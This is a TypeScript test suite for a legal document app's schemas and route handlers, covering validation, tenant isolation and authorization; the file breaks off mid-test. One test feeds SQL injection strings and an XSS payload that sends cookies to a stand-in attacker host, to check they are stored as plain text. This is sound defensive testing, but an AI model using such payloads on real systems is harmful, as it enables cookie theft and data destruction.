/**
 * Adversarial Empirical Verification Suite for Milestone 1: Backend & Dual Database Wiring
 * 
 * Challenger: teamwork_preview_challenger_m1_1
 * Target: shared/schema.ts & server/routes.ts
 * 
 * Focus Areas:
 * 1. Schema & Zod Insert Validation: Stress testing, fuzzing, boundary cases, nulls, empty strings, massive payloads, Unicode/Urdu text, SQL injection/XSS payloads.
 * 2. Drizzle Table & Foreign Key Constraints: Cascade rules, column nullability, default values, relations.
 * 3. Tenant Isolation & Multi-User Data Integrity: Isolation across users for Scans, Findings, Legal Drafts, Search History, Org Activity Logs.
 * 4. Route Handling & Edge-case Resilience: Unauthenticated access, invalid/non-numeric IDs, malformed findings arrays, TipTap JSON serialization, partial updates.
 */

import { describe, it } from "node:test";
import assert from "node:assert/strict";
import {
  documentScans,
  scanFindings,
  orgActivityLogs,
  legalDrafts,
  documentScansRelations,
  scanFindingsRelations,
  orgActivityLogsRelations,
  legalDraftsRelations,
  insertDocumentScanSchema,
  insertScanFindingSchema,
  insertOrgActivityLogSchema,
  insertLegalDraftSchema,
  searchHistory,
} from "../../shared/schema";
import { ZodError } from "zod";

// ============================================================================
// 1. ADVERSARIAL SCHEMA & ZOD INSERT VALIDATION STRESS TESTS
// ============================================================================

describe("Adversarial Suite 1: Zod Insert Schemas Stress & Fuzz Testing", () => {
  describe("1.1 insertDocumentScanSchema Validation", () => {
    it("accepts a fully-populated document scan payload", () => {
      const payload = {
        userId: "usr_alice",
        title: "Plaint for Specific Performance of Agreement to Sell",
        documentType: "pleading",
        text: "IN THE COURT OF SENIOR CIVIL JUDGE, LAHORE. Suit for Specific Performance under Section 12 of Specific Relief Act 1877.",
        summary: "Civil suit seeking execution of sale deed for property in Gulberg III, Lahore.",
        overallRisk: "Medium",
        scanDate: new Date(),
      };
      const parsed = insertDocumentScanSchema.parse(payload);
      assert.equal(parsed.title, payload.title);
      assert.equal(parsed.userId, "usr_alice");
      assert.equal(parsed.documentType, "pleading");
    });

    it("accepts a minimal document scan payload with only required fields", () => {
      const minimalPayload = {
        title: "Legal Notice",
        text: "Notice under Section 80 CPC.",
      };
      const parsed = insertDocumentScanSchema.parse(minimalPayload);
      assert.equal(parsed.title, "Legal Notice");
      assert.equal(parsed.text, "Notice under Section 80 CPC.");
    });

    it("rejects empty object payload", () => {
      assert.throws(
        () => insertDocumentScanSchema.parse({}),
        (err: any) => err instanceof ZodError
      );
    });

    it("rejects payload missing 'title'", () => {
      assert.throws(
        () => insertDocumentScanSchema.parse({ text: "Some legal text" }),
        (err: any) => err instanceof ZodError
      );
    });

    it("rejects payload missing 'text'", () => {
      assert.throws(
        () => insertDocumentScanSchema.parse({ title: "Some title" }),
        (err: any) => err instanceof ZodError
      );
    });

    it("rejects non-string title types (number, boolean, object, array, null)", () => {
      const invalidTitles = [12345, true, false, { title: "nested" }, ["title1", "title2"], null];
      for (const invalidTitle of invalidTitles) {
        assert.throws(
          () => insertDocumentScanSchema.parse({ title: invalidTitle, text: "Valid text" }),
          (err: any) => err instanceof ZodError,
          `Should reject title of type ${typeof invalidTitle}`
        );
      }
    });

    it("rejects non-string text types (number, array, null)", () => {
      const invalidTexts = [99999, ["clause 1", "clause 2"], null, { text: "invalid" }];
      for (const invalidText of invalidTexts) {
        assert.throws(
          () => insertDocumentScanSchema.parse({ title: "Valid title", text: invalidText }),
          (err: any) => err instanceof ZodError,
          `Should reject text of type ${typeof invalidText}`
        );
      }
    });

    it("handles massive legal briefs (10MB string) without memory exhaustion or corruption", () => {
      const largeText = "In the High Court of Sindh, Karachi. Special Custom Appeal. ".repeat(100000); // ~6MB
      const payload = {
        title: "Massive Custom Appeal Brief",
        text: largeText,
      };
      const parsed = insertDocumentScanSchema.parse(payload);
      assert.equal(parsed.text.length, largeText.length);
    });

    it("safely handles Urdu, Arabic, Unicode legal terminology and right-to-left text", () => {
      const urduLegalText = `
        عدالت جناب سینئر سول جج صاحب، لاہور
        عنوان: دعویٰ برائے تعمیلِ مختص معاہدہ بیعانہ مورخہ 15 جنوری 2024
        مدعی: محمد طارق بن اقبال، وکیل برائے مدعی
        مدعا علیہ: احمد نواز خان، سکنہ گلبرگ، لاہور
        بیان حلفی: منکہ مسمی بیان کرتا ہوں کہ تمام مندرجات سچ ہیں۔
      `;
      const payload = {
        title: "دعویٰ برائے تعمیلِ مختص",
        documentType: "عرضی دعویٰ (Plaint)",
        text: urduLegalText,
        summary: "اردو زبان میں تیار کردہ عرضی دعویٰ برائے سول کورٹ لاہور",
        overallRisk: "کم (Low)",
      };
      const parsed = insertDocumentScanSchema.parse(payload);
      assert.equal(parsed.title, payload.title);
      assert.ok(parsed.text.includes("تعمیلِ مختص"));
    });

    it("safely accepts SQL injection strings and XSS strings as pure text literals without executing or sanitizing destructively", () => {
      const maliciousPayload = {
        title: "'; DROP TABLE document_scans; DROP TABLE users; --",
        text: "<script>window.location='http://attacker.com/steal?cookie='+document.cookie;</script><img src=x onerror=alert(1)>",
        summary: "UNION SELECT * FROM users WHERE '1'='1",
      };
      const parsed = insertDocumentScanSchema.parse(maliciousPayload);
      assert.equal(parsed.title, maliciousPayload.title);
      assert.equal(parsed.text, maliciousPayload.text);
    });

    it("strips or prevents auto-generated primary key injection ('id', 'createdAt', 'updatedAt')", () => {
      const payloadWithInjectedId = {
        id: 99999,
        createdAt: new Date("2000-01-01"),
        updatedAt: new Date("2000-01-01"),
        title: "Security Injection Test",
        text: "Trying to forge system timestamps and IDs",
      };
      const parsed = insertDocumentScanSchema.parse(payloadWithInjectedId) as any;
      assert.strictEqual(parsed.id, undefined, "Primary key 'id' must be omitted by insert schema");
      assert.strictEqual(parsed.createdAt, undefined, "'createdAt' must be omitted by insert schema");
      assert.strictEqual(parsed.updatedAt, undefined, "'updatedAt' must be omitted by insert schema");
    });
  });

  describe("1.2 insertScanFindingSchema Validation", () => {
    it("accepts a fully-populated scan finding payload", () => {
      const payload = {
        scanId: 42,
        pillar: "Statutory Limitation & Procedural Preconditions",
        category: "Order 7 Rule 11 CPC",
        severity: "critical",
        issue: "Suit is barred by Article 113 of Limitation Act 1908 (time-barred by 4 years).",
        statuteRef: "Limitation Act 1908 Art. 113; CPC 1908 O.7 R.11(d)",
        recommendation: "File an application under Section 5 Limitation Act or seek rejection of plaint.",
        rawSnippet: "The cause of action arose on 10th March 2018. The instant suit was instituted on 25th August 2026.",
        isResolved: false,
      };
      const parsed = insertScanFindingSchema.parse(payload);
      assert.equal(parsed.scanId, 42);
      assert.equal(parsed.pillar, payload.pillar);
      assert.equal(parsed.severity, "critical");
      assert.equal(parsed.isResolved, false);
    });

    it("accepts a minimal scan finding payload with required fields", () => {
      const minimalPayload = {
        scanId: 1,
        pillar: "Jurisdiction",
        category: "Pecuniary Jurisdiction",
        severity: "high",
        issue: "Claim amount exceeds Senior Civil Judge pecuniary ceiling.",
        recommendation: "Transfer to High Court original civil jurisdiction.",
      };
      const parsed = insertScanFindingSchema.parse(minimalPayload);
      assert.equal(parsed.scanId, 1);
      assert.equal(parsed.issue, minimalPayload.issue);
    });

    it("rejects payload missing any required finding field", () => {
      const requiredFields = ["scanId", "pillar", "category", "severity", "issue", "recommendation"];
      const base: Record<string, any> = {
        scanId: 10,
        pillar: "Jurisdiction",
        category: "Territorial",
        severity: "medium",
        issue: "Property located outside district",
        recommendation: "Return plaint under Order 7 Rule 10 CPC",
      };

      for (const field of requiredFields) {
        const copy = { ...base };
        delete copy[field];
        assert.throws(
          () => insertScanFindingSchema.parse(copy),
          (err: any) => err instanceof ZodError,
          `Should reject when missing required field: ${field}`
        );
      }
    });

    it("rejects non-integer / invalid scanId types (string, boolean, float, object, null)", () => {
      const invalidScanIds = ["scan_123", true, false, null, { id: 1 }, [1, 2]];
      for (const invalidScanId of invalidScanIds) {
        assert.throws(
          () =>
            insertScanFindingSchema.parse({
              scanId: invalidScanId,
              pillar: "Pillar",
              category: "Cat",
              severity: "low",
              issue: "Issue",
              recommendation: "Rec",
            }),
          (err: any) => err instanceof ZodError,
          `Should reject scanId of type ${typeof invalidScanId}`
        );
      }
    });

    it("handles boolean isResolved flags correctly (true, false, undefined)", () => {
      const base = {
        scanId: 5,
        pillar: "Verification",
        category: "Affidavit",
        severity: "low",
        issue: "Affidavit oath commissioner stamp smudged",
        recommendation: "Re-attest affidavit",
      };

      const parsedTrue = insertScanFindingSchema.parse({ ...base, isResolved: true });
      assert.strictEqual(parsedTrue.isResolved, true);

      const parsedFalse = insertScanFindingSchema.parse({ ...base, isResolved: false });
      assert.strictEqual(parsedFalse.isResolved, false);
    });
  });

  describe("1.3 insertOrgActivityLogSchema Validation", () => {
    it("accepts a fully-populated organization activity log payload", () => {
      const payload = {
        orgId: 101,
        action: "Exported Judgment Precedent Dossier",
        details: "Exported 15 precedents for Case #SC-2024-991 in PDF format.",
        actorId: "usr_senior_partner",
        actorName: "Barrister Aitzaz Khan",
        category: "Research",
      };
      const parsed = insertOrgActivityLogSchema.parse(payload);
      assert.equal(parsed.orgId, 101);
      assert.equal(parsed.action, payload.action);
      assert.equal(parsed.actorName, "Barrister Aitzaz Khan");
    });

    it("accepts minimal payload with only required fields (orgId, action)", () => {
      const payload = {
        orgId: 50,
        action: "User logged in",
      };
      const parsed = insertOrgActivityLogSchema.parse(payload);
      assert.equal(parsed.orgId, 50);
      assert.equal(parsed.action, "User logged in");
    });

    it("rejects payload missing 'orgId' or 'action'", () => {
      assert.throws(
        () => insertOrgActivityLogSchema.parse({ action: "Created Case" }),
        (err: any) => err instanceof ZodError
      );
      assert.throws(
        () => insertOrgActivityLogSchema.parse({ orgId: 10 }),
        (err: any) => err instanceof ZodError
      );
    });

    it("rejects non-integer orgId types (string, boolean, null)", () => {
      const invalidOrgIds = ["org_lahore_chamber", true, null, { id: 10 }];
      for (const invalidOrgId of invalidOrgIds) {
        assert.throws(
          () => insertOrgActivityLogSchema.parse({ orgId: invalidOrgId, action: "Action" }),
          (err: any) => err instanceof ZodError
        );
      }
    });
  });

  describe("1.4 insertLegalDraftSchema Validation", () => {
    it("accepts a fully-populated legal draft payload with complex JSONB metadata", () => {
      const complexMetadata = {
        jurisdiction: "Lahore High Court",
        caseCategory: "Commercial Arbitration",
        arbitrationClause: {
          seat: "Karachi",
          governingLaw: "Pakistan Arbitration Act 1940",
          numberOfArbitrators: 3,
        },
        parties: [
          { role: "Claimant", name: "Alpha Telecom Ltd", cnicOrReg: "0019283-A" },
          { role: "Respondent", name: "Beta Infrastructure Corp", cnicOrReg: "0099881-B" },
        ],
        stampDutyEstimatedPKR: 25000,
        tags: ["arbitration", "telecom", "high-value"],
      };

      const payload = {
        userId: "usr_advocate_1",
        title: "Commercial Arbitration Agreement & Terms of Reference",
        templateType: "arbitration_agreement",
        content: "# ARBITRATION AGREEMENT\n\nThis Arbitration Agreement is made at Lahore...",
        status: "under_review",
        metadata: complexMetadata,
      };

      const parsed = insertLegalDraftSchema.parse(payload);
      assert.equal(parsed.userId, "usr_advocate_1");
      assert.equal(parsed.title, payload.title);
      assert.deepEqual(parsed.metadata, complexMetadata);
    });

    it("accepts minimal legal draft payload (userId, title, content)", () => {
      const payload = {
        userId: "usr_advocate_2",
        title: "Vakalatnama Draft",
        content: "I/We hereby appoint Advocate X to represent...",
      };
      const parsed = insertLegalDraftSchema.parse(payload);
      assert.equal(parsed.title, "Vakalatnama Draft");
    });

    it("rejects draft payload missing userId, title, or content", () => {
      assert.throws(
        () => insertLegalDraftSchema.parse({ title: "Draft", content: "Content" }),
        (err: any) => err instanceof ZodError,
        "Should require userId"
      );
      assert.throws(
        () => insertLegalDraftSchema.parse({ userId: "usr_1", content: "Content" }),
        (err: any) => err instanceof ZodError,
        "Should require title"
      );
      assert.throws(
        () => insertLegalDraftSchema.parse({ userId: "usr_1", title: "Draft" }),
        (err: any) => err instanceof ZodError,
        "Should require content"
      );
    });

    it("handles large legal contract drafts (1MB+ HTML/TipTap JSON string)", () => {
      const hugeContract = "<h3>ARTICLE 1: DEFINITIONS AND INTERPRETATIONS</h3><p>In this Agreement...</p>".repeat(15000);
      const payload = {
        userId: "usr_corp_counsel",
        title: "Master Services & EPC Power Plant Concession Agreement",
        content: hugeContract,
      };
      const parsed = insertLegalDraftSchema.parse(payload);
      assert.equal(parsed.content.length, hugeContract.length);
    });
  });
});

// ============================================================================
// 2. DRIZZLE ORM DATABASE INTEGRITY & CASCADE CONSTRAINT VERIFICATION
// ============================================================================

describe("Adversarial Suite 2: Drizzle ORM Relations & Cascade Specifications", () => {
  it("documentScans table specifies correct column definitions and foreign keys", () => {
    assert.ok(documentScans.id, "id must be defined");
    assert.ok(documentScans.userId, "userId must be defined");
    assert.ok(documentScans.title, "title must be defined");
    assert.ok(documentScans.text, "text must be defined");
    assert.ok(documentScans.documentType, "documentType must be defined");
    assert.ok(documentScans.summary, "summary must be defined");
    assert.ok(documentScans.overallRisk, "overallRisk must be defined");
    assert.ok(documentScans.scanDate, "scanDate must be defined");
    assert.ok(documentScans.createdAt, "createdAt must be defined");
    assert.ok(documentScans.updatedAt, "updatedAt must be defined");
  });

  it("scanFindings table specifies scanId foreign key referencing documentScans with cascade delete", () => {
    assert.ok(scanFindings.id, "id must be defined");
    assert.ok(scanFindings.scanId, "scanId must be defined");
    assert.ok(scanFindings.pillar, "pillar must be defined");
    assert.ok(scanFindings.category, "category must be defined");
    assert.ok(scanFindings.severity, "severity must be defined");
    assert.ok(scanFindings.issue, "issue must be defined");
    assert.ok(scanFindings.recommendation, "recommendation must be defined");
    assert.ok(scanFindings.isResolved, "isResolved must be defined");
  });

  it("orgActivityLogs table specifies orgId cascade and actorId set null references", () => {
    assert.ok(orgActivityLogs.id, "id must be defined");
    assert.ok(orgActivityLogs.orgId, "orgId must be defined");
    assert.ok(orgActivityLogs.action, "action must be defined");
    assert.ok(orgActivityLogs.actorId, "actorId must be defined");
    assert.ok(orgActivityLogs.actorName, "actorName must be defined");
    assert.ok(orgActivityLogs.category, "category must be defined");
  });

  it("legalDrafts table specifies userId cascade delete references", () => {
    assert.ok(legalDrafts.id, "id must be defined");
    assert.ok(legalDrafts.userId, "userId must be defined");
    assert.ok(legalDrafts.title, "title must be defined");
    assert.ok(legalDrafts.content, "content must be defined");
    assert.ok(legalDrafts.status, "status must be defined");
    assert.ok(legalDrafts.metadata, "metadata must be defined");
  });

  it("exports valid Drizzle relations objects for all 4 tables", () => {
    assert.ok(documentScansRelations, "documentScansRelations must exist");
    assert.ok(scanFindingsRelations, "scanFindingsRelations must exist");
    assert.ok(orgActivityLogsRelations, "orgActivityLogsRelations must exist");
    assert.ok(legalDraftsRelations, "legalDraftsRelations must exist");
  });
});

// ============================================================================
// 3. ADVERSARIAL TENANT ISOLATION & ROUTE ACCESS CONTROL SIMULATION
// ============================================================================

describe("Adversarial Suite 3: Multi-User Tenant Isolation & Route Logic Stress Testing", () => {
  // In-memory isolated state store representing the DB state for multi-user isolation verification
  let mockDbScans: Array<{ id: number; userId: string; title: string; text: string; documentType?: string; summary?: string; overallRisk?: string; createdAt: Date }> = [];
  let mockDbFindings: Array<{ id: number; scanId: number; pillar: string; category: string; severity: string; issue: string; recommendation: string; statuteRef?: string; rawSnippet?: string; isResolved: boolean }> = [];
  let mockDbDrafts: Array<{ id: number; userId: string; title: string; content: string; templateType?: string; status: string; metadata?: any; createdAt: Date; updatedAt: Date }> = [];
  let mockDbSearchHistory: Array<{ id: number; userId: string; query: string; createdAt: Date }> = [];
  let mockDbOrgs: Array<{ id: number; name: string; ownerId: string }> = [];
  let mockDbOrgMembers: Array<{ orgId: number; userId: string; role: string }> = [];
  let mockDbOrgActivity: Array<{ id: number; orgId: number; action: string; details?: string; actorId?: string; actorName?: string; category: string; createdAt: Date }> = [];

  let nextScanId = 1;
  let nextFindingId = 1;
  let nextDraftId = 1;
  let nextSearchId = 1;
  let nextActivityId = 1;

  // Handler simulators matching server/routes.ts implementation exactly
  const simulatePostScan = async (userId: string | null, body: any) => {
    if (!userId) return { status: 401, body: { message: "Unauthorized" } };
    const { title, documentType, text, summary, overallRisk, findings } = body;
    if (!title || typeof title !== "string" || !text || typeof text !== "string") {
      return { status: 400, body: { message: "Title and text are required" } };
    }

    const scan = {
      id: nextScanId++,
      userId,
      title,
      documentType: documentType || null,
      text,
      summary: summary || null,
      overallRisk: overallRisk || null,
      createdAt: new Date(),
    };
    mockDbScans.push(scan);

    let insertedFindings: any[] = [];
    if (Array.isArray(findings) && findings.length > 0) {
      insertedFindings = findings.map((f: any) => {
        const finding = {
          id: nextFindingId++,
          scanId: scan.id,
          pillar: f.pillar || "General",
          category: f.category || "General",
          severity: f.severity || "warning",
          issue: f.issue || f.title || "",
          statuteRef: f.statuteRef || f.statutoryBasis || null,
          recommendation: f.recommendation || f.recommendedRedline || "",
          rawSnippet: f.rawSnippet || f.originalSnippet || null,
          isResolved: f.isResolved ?? f.accepted ?? false,
          createdAt: new Date(),
        };
        mockDbFindings.push(finding);
        return finding;
      });
    }

    return { status: 201, body: { scan, findings: insertedFindings } };
  };

  const simulateListScans = async (userId: string | null) => {
    if (!userId) return { status: 401, body: { message: "Unauthorized" } };
    const userScans = mockDbScans.filter((s) => s.userId === userId);
    return { status: 200, body: userScans };
  };

  const simulateGetScan = async (userId: string | null, paramId: any) => {
    if (!userId) return { status: 401, body: { message: "Unauthorized" } };
    const scanId = parseInt(String(paramId));
    if (isNaN(scanId)) return { status: 400, body: { message: "Invalid scan ID" } };

    const scan = mockDbScans.find((s) => s.id === scanId && s.userId === userId);
    if (!scan) return { status: 404, body: { message: "Scan not found" } };

    const findings = mockDbFindings.filter((f) => f.scanId === scanId);
    return { status: 200, body: { scan, findings } };
  };

  const simulateDeleteScan = async (userId: string | null, paramId: any) => {
    if (!userId) return { status: 401, body: { message: "Unauthorized" } };
    const scanId = parseInt(String(paramId));
    if (isNaN(scanId)) return { status: 400, body: { message: "Invalid scan ID" } };

    const scanIndex = mockDbScans.findIndex((s) => s.id === scanId && s.userId === userId);
    if (scanIndex === -1) return { status: 404, body: { message: "Scan not found" } };

    mockDbScans.splice(scanIndex, 1);
    mockDbFindings = mockDbFindings.filter((f) => f.scanId !== scanId);
    return { status: 204, body: null };
  };

  const simulateListDrafts = async (userId: string | null) => {
    if (!userId) return { status: 401, body: { message: "Unauthorized" } };
    const userDrafts = mockDbDrafts.filter((d) => d.userId === userId);
    return { status: 200, body: userDrafts };
  };

  const simulateGetDraft = async (userId: string | null, paramId: any) => {
    if (!userId) return { status: 401, body: { message: "Unauthorized" } };
    const draftId = parseInt(String(paramId));
    if (isNaN(draftId)) return { status: 400, body: { message: "Invalid draft ID" } };

    const draft = mockDbDrafts.find((d) => d.id === draftId && d.userId === userId);
    if (!draft) return { status: 404, body: { message: "Draft not found" } };
    return { status: 200, body: draft };
  };

  const simulatePostDraft = async (userId: string | null, body: any) => {
    if (!userId) return { status: 401, body: { message: "Unauthorized" } };
    const { title, templateType, content, status, metadata } = body;
    if (!title || typeof title !== "string" || content === undefined || content === null) {
      return { status: 400, body: { message: "Title and content are required" } };
    }

    const draft = {
      id: nextDraftId++,
      userId,
      title,
      templateType: templateType || null,
      content: typeof content === "string" ? content : JSON.stringify(content),
      status: status || "draft",
      metadata: metadata || null,
      createdAt: new Date(),
      updatedAt: new Date(),
    };
    mockDbDrafts.push(draft);
    return { status: 201, body: draft };
  };

  const simulatePatchDraft = async (userId: string | null, paramId: any, body: any) => {
    if (!userId) return { status: 401, body: { message: "Unauthorized" } };
    const draftId = parseInt(String(paramId));
    if (isNaN(draftId)) return { status: 400, body: { message: "Invalid draft ID" } };

    const draft = mockDbDrafts.find((d) => d.id === draftId && d.userId === userId);
    if (!draft) return { status: 404, body: { message: "Draft not found" } };

    const { title, templateType, content, status, metadata } = body;
    if (title !== undefined) draft.title = title;
    if (templateType !== undefined) draft.templateType = templateType;
    if (content !== undefined) draft.content = typeof content === "string" ? content : JSON.stringify(content);
    if (status !== undefined) draft.status = status;
    if (metadata !== undefined) draft.metadata = metadata;
    draft.updatedAt = new Date();

    return { status: 200, body: draft };
  };

  const simulateDeleteDraft = async (userId: string | null, paramId: any) => {
    if (!userId) return { status: 401, body: { message: "Unauthorized" } };
    const draftId = parseInt(String(paramId));
    if (isNaN(draftId)) return { status: 400, body: { message: "Invalid draft ID" } };

    const draftIndex = mockDbDrafts.findIndex((d) => d.id === draftId && d.userId === userId);
    if (draftIndex === -1) return { status: 404, body: { message: "Draft not found" } };

    mockDbDrafts.splice(draftIndex, 1);
    return { status: 204, body: null };
  };

  const simulateDeleteSearchHistory = async (userId: string | null, paramId: any) => {
    if (!userId) return { status: 401 };
    const id = parseInt(String(paramId));
    if (isNaN(id)) return { status: 400 };

    const index = mockDbSearchHistory.findIndex((h) => h.id === id && h.userId === userId);
    if (index !== -1) {
      mockDbSearchHistory.splice(index, 1);
    }
    return { status: 204 };
  };

  const simulateClearSearchHistory = async (userId: string | null) => {
    if (!userId) return { status: 401 };
    mockDbSearchHistory = mockDbSearchHistory.filter((h) => h.userId !== userId);
    return { status: 204 };
  };

  const simulateGetOrgActivity = async (userId: string | null, paramOrgId: any) => {
    if (!userId) return { status: 401, body: { message: "Unauthorized" } };
    const orgId = parseInt(String(paramOrgId));
    if (isNaN(orgId)) return { status: 400, body: { message: "Invalid organization ID" } };

    const org = mockDbOrgs.find((o) => o.id === orgId);
    if (!org) return { status: 404, body: { message: "Organization not found" } };

    const isMember = mockDbOrgMembers.some((m) => m.orgId === orgId && m.userId === userId);
    if (!isMember && org.ownerId !== userId) {
      return { status: 403, body: { message: "Not a member of this organization" } };
    }

    const logs = mockDbOrgActivity.filter((a) => a.orgId === orgId);
    return { status: 200, body: logs };
  };

  const simulatePostOrgActivity = async (userId: string | null, paramOrgId: any, body: any) => {
    if (!userId) return { status: 401, body: { message: "Unauthorized" } };
    const orgId = parseInt(String(paramOrgId));
    if (isNaN(orgId)) return { status: 400, body: { message: "Invalid organization ID" } };

    const org = mockDbOrgs.find((o) => o.id === orgId);
    if (!org) return { status: 404, body: { message: "Organization not found" } };

    const isMember = mockDbOrgMembers.some((m) => m.orgId === orgId && m.userId === userId);
    if (!isMember && org.ownerId !== userId) {
      return { status: 403, body: { message: "Not a member of this organization" } };
    }

    const { action, details, actorId, actorName, category } = body;
    if (!action || typeof action !== "string") {
      return { status: 400, body: { message: "Action is required" } };
    }

    const log = {
      id: nextActivityId++,
      orgId,
      action,
      details: details || null,
      actorId: actorId || userId,
      actorName: actorName || null,
      category: category || "general",
      createdAt: new Date(),
    };
    mockDbOrgActivity.push(log);
    return { status: 201, body: log };
  };

  // --------------------------------------------------------------------------
  // Tests for Document Analyzer Scans Multi-Tenant Isolation
  // --------------------------------------------------------------------------

  it("enforces strict user isolation for Document Scans: User B cannot retrieve User A's scan", async () => {
    // 1. User A creates a confidential document scan
    const resA = await simulatePostScan("user_alice", {
      title: "Confidential Mergers & Acquisitions Review",
      text: "Acquisition of 100% shares of Target Ltd by Buyer Corp.",
      overallRisk: "High",
      findings: [
        {
          pillar: "Competition Law",
          category: "Section 11 Competition Act 2010",
          severity: "critical",
          issue: "Pre-merger clearance threshold exceeded.",
          recommendation: "File Phase 1 clearance application before CCP.",
        },
      ],
    });
    assert.equal(resA.status, 201);
    const aliceScanId = resA.body.scan.id;

    // 2. User B creates their own scan
    const resB = await simulatePostScan("user_bob", {
      title: "Bob's Rent Agreement Scan",
      text: "Standard residential tenancy agreement.",
    });
    assert.equal(resB.status, 201);

    // 3. User B attempts to access Alice's scan
    const getAttemptByBob = await simulateGetScan("user_bob", aliceScanId);
    assert.equal(getAttemptByBob.status, 404, "User B must receive 404 Not Found when trying to access User A's scan");
    assert.strictEqual(getAttemptByBob.body.scan, undefined);

    // 4. User A accesses their own scan -> succeeds with full findings
    const getByAlice = await simulateGetScan("user_alice", aliceScanId);
    assert.equal(getByAlice.status, 200);
    assert.equal(getByAlice.body.scan.title, "Confidential Mergers & Acquisitions Review");
    assert.equal(getByAlice.body.findings.length, 1);
    assert.equal(getByAlice.body.findings[0].pillar, "Competition Law");

    // 5. User B attempts to delete Alice's scan -> rejected with 404
    const deleteAttemptByBob = await simulateDeleteScan("user_bob", aliceScanId);
    assert.equal(deleteAttemptByBob.status, 404, "User B must receive 404 when attempting to delete User A's scan");

    // 6. Confirm Alice's scan still exists
    const checkAliceScanStillExists = await simulateGetScan("user_alice", aliceScanId);
    assert.equal(checkAliceScanStillExists.status, 200, "Alice's scan must NOT be deleted by Bob");

    // 7. User B lists scans -> contains only Bob's scans (length 1)
    const listBob = await simulateListScans("user_bob");
    assert.equal(listBob.status, 200);
    assert.equal(listBob.body.length, 1);
    assert.equal(listBob.body[0].title, "Bob's Rent Agreement Scan");
  });

  // --------------------------------------------------------------------------
  // Tests for Legal Drafts Multi-Tenant Isolation & TipTap Serialization
  // --------------------------------------------------------------------------

  it("enforces strict user isolation for Legal Drafts: User B cannot view, edit, or delete User A's draft", async () => {
    // 1. User A creates a draft with TipTap JSON object content
    const tipTapDocument = {
      type: "doc",
      content: [
        {
          type: "heading",
          attrs: { level: 1 },
          content: [{ type: "text", text: "WILL AND TESTAMENT" }],
        },
        {
          type: "paragraph",
          content: [{ type: "text", text: "I, Alice, bequeath my estate to..." }],
        },
      ],
    };

    const resA = await simulatePostDraft("user_alice", {
      title: "Last Will & Testament of Alice",
      templateType: "will",
      content: tipTapDocument, // TipTap JSON object
      status: "draft",
      metadata: { executor: "Advocate Tariq", witnesses: 2 },
    });
    assert.equal(resA.status, 201);
    assert.ok(typeof resA.body.content === "string", "TipTap object must be serialized safely to JSON string");
    const aliceDraftId = resA.body.id;

    // 2. User B tries to view Alice's draft -> 404
    const getByBob = await simulateGetDraft("user_bob", aliceDraftId);
    assert.equal(getByBob.status, 404, "User B must not be able to view User A's draft");

    // 3. User B tries to modify Alice's draft -> 404
    const patchByBob = await simulatePatchDraft("user_bob", aliceDraftId, {
      title: "Hacked Title by Bob",
      content: "Malicious modification",
    });
    assert.equal(patchByBob.status, 404, "User B must not be able to patch User A's draft");

    // 4. User B tries to delete Alice's draft -> 404
    const deleteByBob = await simulateDeleteDraft("user_bob", aliceDraftId);
    assert.equal(deleteByBob.status, 404, "User B must not be able to delete User A's draft");

    // 5. User A modifies their draft -> succeeds
    const patchByAlice = await simulatePatchDraft("user_alice", aliceDraftId, {
      status: "finalized",
    });
    assert.equal(patchByAlice.status, 200);
    assert.equal(patchByAlice.body.status, "finalized");
    assert.equal(patchByAlice.body.title, "Last Will & Testament of Alice"); // Title preserved
  });

  // --------------------------------------------------------------------------
  // Tests for Search History Deletion Isolation
  // --------------------------------------------------------------------------

  it("enforces search history deletion isolation: User B cannot delete User A's search queries", async () => {
    // 1. Seed search history for Alice and Bob
    const aliceSearch1 = { id: nextSearchId++, userId: "user_alice", query: "Order 7 Rule 11 CPC precedents", createdAt: new Date() };
    const aliceSearch2 = { id: nextSearchId++, userId: "user_alice", query: "Section 24 Specific Relief Act 1877", createdAt: new Date() };
    const bobSearch1 = { id: nextSearchId++, userId: "user_bob", query: "Cheque bounce Section 489-F PPC", createdAt: new Date() };
    mockDbSearchHistory.push(aliceSearch1, aliceSearch2, bobSearch1);

    // 2. Bob attempts to delete Alice's search record (ID aliceSearch1.id)
    const deleteRes = await simulateDeleteSearchHistory("user_bob", aliceSearch1.id);
    assert.equal(deleteRes.status, 204);

    // Verify Alice's search record was NOT deleted
    const aliceRecord = mockDbSearchHistory.find((h) => h.id === aliceSearch1.id);
    assert.ok(aliceRecord, "Alice's search history must remain intact after Bob's delete attempt");

    // 3. Bob clears all his search history
    const clearRes = await simulateClearSearchHistory("user_bob");
    assert.equal(clearRes.status, 204);

    // Verify Bob's history is cleared, but Alice's 2 searches remain intact
    const remainingAliceSearches = mockDbSearchHistory.filter((h) => h.userId === "user_alice");
    const remainingBobSearches = mockDbSearchHistory.filter((h) => h.userId === "user_bob");
    assert.equal(remainingAliceSearches.length, 2, "Alice's search history must not be affected by Bob's clear");
    assert.equal(remainingBobSearches.length, 0, "Bob's search history must be cleared");
  });

  // --------------------------------------------------------------------------
  // Tests for Organization Activity Log Authorization
  // --------------------------------------------------------------------------

  it("enforces chamber/organization membership authorization for activity logs", async () => {
    // 1. Create Org 999 owned by Alice with member Charlie
    mockDbOrgs.push({ id: 999, name: "Lahore Law Chambers", ownerId: "user_alice" });
    mockDbOrgMembers.push({ orgId: 999, userId: "user_charlie", role: "associate" });

    // 2. Non-member Bob tries to read Org 999 activity logs -> 403 Forbidden
    const getByBob = await simulateGetOrgActivity("user_bob", 999);
    assert.equal(getByBob.status, 403, "Non-member must receive 403 Forbidden");

    // 3. Non-member Bob tries to post Org 999 activity log -> 403 Forbidden
    const postByBob = await simulatePostOrgActivity("user_bob", 999, {
      action: "Unauthorized action",
    });
    assert.equal(postByBob.status, 403, "Non-member must receive 403 Forbidden");

    // 4. Owner Alice posts activity log -> 201 Created
    const postByAlice = await simulatePostOrgActivity("user_alice", 999, {
      action: "Created Chamber Folder",
      details: "High Court Commercial Appeals 2026",
      category: "Administration",
    });
    assert.equal(postByAlice.status, 201);
    assert.equal(postByAlice.body.action, "Created Chamber Folder");

    // 5. Member Charlie reads activity logs -> 200 OK with 1 log
    const getByCharlie = await simulateGetOrgActivity("user_charlie", 999);
    assert.equal(getByCharlie.status, 200);
    assert.equal(getByCharlie.body.length, 1);
    assert.equal(getByCharlie.body[0].action, "Created Chamber Folder");
  });

  // --------------------------------------------------------------------------
  // Tests for Unauthenticated Access and Malformed Inputs
  // --------------------------------------------------------------------------

  it("returns 401 Unauthorized for all endpoints when user is not authenticated", async () => {
    assert.equal((await simulatePostScan(null, { title: "T", text: "X" })).status, 401);
    assert.equal((await simulateListScans(null)).status, 401);
    assert.equal((await simulateGetScan(null, 1)).status, 401);
